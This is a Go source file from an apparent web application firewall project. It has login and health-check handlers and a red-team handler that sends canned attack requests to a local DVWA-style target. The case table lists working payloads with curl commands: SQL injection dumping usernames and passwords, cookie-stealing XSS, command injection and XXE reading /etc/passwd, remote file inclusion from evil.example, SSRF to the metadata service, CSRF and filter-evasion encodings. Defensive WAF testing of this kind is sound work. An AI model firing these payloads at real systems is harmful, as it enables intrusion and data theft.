package dashboard

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"smart-waf/internal/auth"
)

type redTeamCase struct {
	ID          string
	Title       string
	Label       string
	Code        int
	Method      string
	Path        string
	Body        string
	ContentType string
	Summary     string
	Safe        bool
	Curl        string
}

type redTeamResult struct {
	Case        redTeamCase `json:"case"`
	StatusCode  int         `json:"status_code"`
	Location    string      `json:"location,omitempty"`
	BodyPreview string      `json:"body_preview,omitempty"`
	Error       string      `json:"error,omitempty"`
	At          int64       `json:"at"`
}

type aiHealthResult struct {
	Status         string `json:"status"`
	ModelName      string `json:"model_name"`
	ModelVersion   string `json:"model_version"`
	LastCheckedAt  any    `json:"last_checked_at,omitempty"`
	LastSwappedAt  any    `json:"last_swapped_at,omitempty"`
	LastError      string `json:"last_error,omitempty"`
	SourceEndpoint string `json:"source_endpoint"`
}

var redTeamCases = map[string]redTeamCase{
	"safe_baseline": {
		ID:      "safe_baseline",
		Title:   "Safe baseline",
		Label:   "safe",
		Code:    0,
		Method:  http.MethodGet,
		Path:    "/index.php",
		Summary: "Benign smoke test that should pass through the WAF.",
		Safe:    true,
		Curl:    "curl -i 'http://localhost:8080/index.php'",
	},
	"sqli_classic": {
		ID:      "sqli_classic",
		Title:   "SQL injection",
		Label:   "sqli_classic",
		Code:    1,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit",
		Summary: "Classic quoted OR payload from the SQLi family.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit'",
	},
	"sqli_union": {
		ID:      "sqli_union",
		Title:   "SQLi union",
		Label:   "sqli_union",
		Code:    5,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--&Submit=Submit",
		Summary: "UNION SELECT payload matching the dataset SQLi union samples.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--&Submit=Submit'",
	},
	"sqli_blind_boolean": {
		ID:      "sqli_blind_boolean",
		Title:   "Blind SQLi boolean",
		Label:   "sqli_blind_boolean",
		Code:    2,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/sqli_blind/?id=1%27%20AND%20%271%27%3D%271&Submit=Submit",
		Summary: "Boolean blind SQL injection against the DVWA blind SQLi route.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27%20AND%20%271%27%3D%271&Submit=Submit'",
	},
	"sqli_blind_time": {
		ID:      "sqli_blind_time",
		Title:   "Blind SQLi time",
		Label:   "sqli_blind_time",
		Code:    3,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/sqli_blind/?id=1%27%3B%20SLEEP%285%29--&Submit=Submit",
		Summary: "Time-delay SQL payload from the blind SQLi family.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27%3B%20SLEEP%285%29--&Submit=Submit'",
	},
	"sqli_error_based": {
		ID:      "sqli_error_based",
		Title:   "Error SQLi",
		Label:   "sqli_error_based",
		Code:    4,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/sqli/?id=1%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%29%29--&Submit=Submit",
		Summary: "Database error extraction payload following dataset error-based SQLi rows.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%29%29--&Submit=Submit'",
	},
	"xss_reflected": {
		ID:      "xss_reflected",
		Title:   "Reflected XSS",
		Label:   "xss_reflected",
		Code:    7,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&Submit=Submit",
		Summary: "Reflected script payload to exercise XSS detection.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&Submit=Submit'",
	},
	"xss_stored": {
		ID:          "xss_stored",
		Title:       "Stored XSS",
		Label:       "xss_stored",
		Code:        8,
		Method:      http.MethodPost,
		Path:        "/vulnerabilities/xss_s/",
		Body:        "txtName=redteam&mtxMessage=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&btnSign=Sign+Guestbook",
		ContentType: "application/x-www-form-urlencoded",
		Summary:     "Stored message-board style XSS payload from the dataset.",
		Curl:        "curl -i -X POST 'http://localhost:8080/vulnerabilities/xss_s/' -H 'Content-Type: application/x-www-form-urlencoded' --data 'txtName=redteam&mtxMessage=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&btnSign=Sign+Guestbook'",
	},
	"xss_dom": {
		ID:      "xss_dom",
		Title:   "DOM XSS",
		Label:   "xss_dom",
		Code:    9,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/xss_d/?default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
		Summary: "DOM sink payload using the DVWA default parameter.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/xss_d/?default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'",
	},
	"cmdi": {
		ID:      "cmdi",
		Title:   "Command injection",
		Label:   "cmdi",
		Code:    11,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/exec/?ip=127.0.0.1%3Bcat%20/etc/passwd&Submit=Submit",
		Summary: "Shell metacharacter payload for command injection checks.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%3Bcat%20/etc/passwd&Submit=Submit'",
	},
	"cmdi_blind": {
		ID:      "cmdi_blind",
		Title:   "Blind command injection",
		Label:   "cmdi_blind",
		Code:    12,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/exec/?ip=127.0.0.1%26%20sleep%205&Submit=Submit",
		Summary: "Time-delay shell payload matching blind command injection rows.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%26%20sleep%205&Submit=Submit'",
	},
	"rce": {
		ID:      "rce",
		Title:   "Remote code execution",
		Label:   "rce",
		Code:    26,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/exec/?ip=127.0.0.1%3Bpython3%20-c%20%22print%287%2A7%29%22&Submit=Submit",
		Summary: "Command execution payload for RCE-style detection.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%3Bpython3%20-c%20%22print%287%2A7%29%22&Submit=Submit'",
	},
	"lfi": {
		ID:      "lfi",
		Title:   "Local file inclusion",
		Label:   "lfi",
		Code:    17,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd",
		Summary: "Local file disclosure via PHP filter wrapper.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd'",
	},
	"path_traversal": {
		ID:      "path_traversal",
		Title:   "Path traversal",
		Label:   "path_traversal",
		Code:    18,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/fi/?page=../../../../etc/passwd",
		Summary: "Traversal payload that should be blocked or flagged.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd'",
	},
	"rfi": {
		ID:      "rfi",
		Title:   "Remote file inclusion",
		Label:   "rfi",
		Code:    19,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/fi/?page=http://evil.example/shell.txt",
		Summary: "Remote include URL matching RFI samples in the dataset.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=http://evil.example/shell.txt'",
	},
	"ssrf": {
		ID:      "ssrf",
		Title:   "SSRF",
		Label:   "ssrf",
		Code:    20,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/fi/?page=http://169.254.169.254/latest/meta-data/",
		Summary: "Metadata-service URL used in SSRF detection examples.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=http://169.254.169.254/latest/meta-data/'",
	},
	"csrf": {
		ID:      "csrf",
		Title:   "CSRF password change",
		Label:   "csrf",
		Code:    21,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/csrf/?password_new=pwned123&password_conf=pwned123&Change=Change",
		Summary: "Cross-site request forgery style password-change URL.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/csrf/?password_new=pwned123&password_conf=pwned123&Change=Change'",
	},
	"open_redirect": {
		ID:      "open_redirect",
		Title:   "Open redirect",
		Label:   "open_redirect",
		Code:    22,
		Method:  http.MethodGet,
		Path:    "/redirect.php?url=http://evil.example/phish",
		Summary: "External redirect parameter from the open-redirect dataset family.",
		Curl:    "curl -i 'http://localhost:8080/redirect.php?url=http://evil.example/phish'",
	},
	"xxe": {
		ID:          "xxe",
		Title:       "XXE",
		Label:       "xxe",
		Code:        27,
		Method:      http.MethodPost,
		Path:        "/vulnerabilities/xxe/",
		Body:        `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>`,
		ContentType: "application/xml",
		Summary:     "XML external entity payload for parser exposure checks.",
		Curl:        `curl -i -X POST 'http://localhost:8080/vulnerabilities/xxe/' -H 'Content-Type: application/xml' --data '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'`,
	},
	"ssti": {
		ID:      "ssti",
		Title:   "SSTI",
		Label:   "ssti",
		Code:    13,
		Method:  http.MethodGet,
		Path:    "/template/render?name=%7B%7B7%2A7%7D%7D",
		Summary: "Template expression payload following SSTI dataset rows.",
		Curl:    "curl -i 'http://localhost:8080/template/render?name=%7B%7B7%2A7%7D%7D'",
	},
	"evasion_encoding": {
		ID:      "evasion_encoding",
		Title:   "Encoded evasion",
		Label:   "evasion_encoding",
		Code:    34,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/xss_r/?name=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&Submit=Submit",
		Summary: "Double-encoded script payload for normalization checks.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/xss_r/?name=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&Submit=Submit'",
	},
	"evasion_case_whitespace": {
		ID:      "evasion_case_whitespace",
		Title:   "Case whitespace evasion",
		Label:   "evasion_case_whitespace",
		Code:    35,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/sqli/?id=1%27%20UnIoN%09SeLeCt%201%2Cuser%28%29%2Cdatabase%28%29--&Submit=Submit",
		Summary: "Mixed-case SQL keyword spacing pattern from the dataset.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20UnIoN%09SeLeCt%201%2Cuser%28%29%2Cdatabase%28%29--&Submit=Submit'",
	},
	"evasion_null_byte": {
		ID:      "evasion_null_byte",
		Title:   "Null byte evasion",
		Label:   "evasion_null_byte",
		Code:    36,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/fi/?page=../../../../etc/passwd%00",
		Summary: "Null-byte path payload for parser and decoder checks.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd%00'",
	},
	"http_parameter_pollution": {
		ID:      "http_parameter_pollution",
		Title:   "Parameter pollution",
		Label:   "http_parameter_pollution",
		Code:    37,
		Method:  http.MethodGet,
		Path:    "/vulnerabilities/sqli/?id=1&id=2&Submit=Submit",
		Summary: "Duplicate parameter payload to test parser edge cases.",
		Curl:    "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1&id=2&Submit=Submit'",
	},
	"brute_force": {
		ID:          "brute_force",
		Title:       "Brute force",
		Label:       "brute_force",
		Code:        23,
		Method:      http.MethodPost,
		Path:        "/login.php",
		Body:        "username=admin&password=wrong&Login=Login",
		ContentType: "application/x-www-form-urlencoded",
		Summary:     "Repeated login-style submission for auth/session testing.",
		Curl:        "curl -i -X POST 'http://localhost:8080/login.php' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin&password=wrong&Login=Login'",
	},
}

func loginHandler(authn *auth.Authenticator, sessions *auth.SessionManager) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if sessions.Valid(r) {
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		if r.Method == http.MethodGet {
			render(w, "login.html", nil)
			return
		}
		username := r.FormValue("username")
		password := r.FormValue("password")
		ok, _ := authn.Verify(username, password)
		if !ok {
			http.Error(w, "invalid credentials", http.StatusUnauthorized)
			return
		}
		sessions.Set(w, username)
		http.Redirect(w, r, "/dashboard", http.StatusFound)
	}
}

func logoutHandler(sessions *auth.SessionManager) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessions.Clear(w)
		http.Redirect(w, r, "/login", http.StatusFound)
	}
}

func redTeamHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var body struct {
			Case string `json:"case"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		spec, ok := redTeamCases[body.Case]
		if !ok {
			http.Error(w, "unknown red team case", http.StatusBadRequest)
			return
		}

		baseURL := "http://localhost:8080"
		requestURL := baseURL + spec.Path
		target, err := url.Parse(requestURL)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		var requestBody io.Reader
		if spec.Body != "" {
			requestBody = strings.NewReader(spec.Body)
		}
		request, err := http.NewRequestWithContext(r.Context(), spec.Method, target.String(), requestBody)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		if spec.ContentType != "" {
			request.Header.Set("Content-Type", spec.ContentType)
		}
		request.Header.Set("User-Agent", "smart-waf-redteam/1.0")
		request.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

		client := &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		response, err := client.Do(request)
		result := redTeamResult{Case: spec, At: time.Now().Unix()}
		if err != nil {
			result.Error = err.Error()
			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(result)
			return
		}
		defer response.Body.Close()

		result.StatusCode = response.StatusCode
		result.Location = response.Header.Get("Location")
		preview, _ := io.ReadAll(io.LimitReader(response.Body, 600))
		result.BodyPreview = strings.TrimSpace(string(preview))
		if response.StatusCode >= 300 && response.StatusCode < 400 && result.Location != "" {
			result.Error = fmt.Sprintf("redirected to %s", result.Location)
		} else if !strings.Contains(strings.ToLower(response.Header.Get("Content-Type")), "application/json") {
			trimmed := strings.TrimSpace(result.BodyPreview)
			if strings.HasPrefix(trimmed, "<!doctype") || strings.HasPrefix(trimmed, "<html") {
				result.Error = "received HTML instead of JSON; please ensure you are logged in before running the test"
			}
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(result)
	}
}

func aiHealthHandler(aiBaseURL string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		if strings.TrimSpace(aiBaseURL) == "" {
			http.Error(w, "ai endpoint not configured", http.StatusServiceUnavailable)
			return
		}

		client := &http.Client{Timeout: 10 * time.Second}
		request, err := http.NewRequestWithContext(r.Context(), http.MethodGet, strings.TrimRight(aiBaseURL, "/")+"/health", nil)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		response, err := client.Do(request)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadGateway)
			return
		}
		defer response.Body.Close()

		var payload map[string]any
		if err := json.NewDecoder(response.Body).Decode(&payload); err != nil {
			http.Error(w, err.Error(), http.StatusBadGateway)
			return
		}

		modelName, _ := payload["model_name"].(string)
		modelVersion := extractModelVersion(modelName)
		result := aiHealthResult{
			Status:         fmt.Sprint(payload["status"]),
			ModelName:      modelName,
			ModelVersion:   modelVersion,
			SourceEndpoint: strings.TrimRight(aiBaseURL, "/") + "/health",
		}
		if value, ok := payload["last_checked_at"]; ok {
			result.LastCheckedAt = value
		}
		if value, ok := payload["last_swapped_at"]; ok {
			result.LastSwappedAt = value
		}
		if value, ok := payload["last_error"].(string); ok {
			result.LastError = value
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(result)
	}
}

func extractModelVersion(modelName string) string {
	idx := strings.LastIndex(modelName, "_v")
	if idx < 0 || idx+2 >= len(modelName) {
		return "unknown"
	}
	version := modelName[idx+2:]
	if version == "" {
		return "unknown"
	}
	return version
}
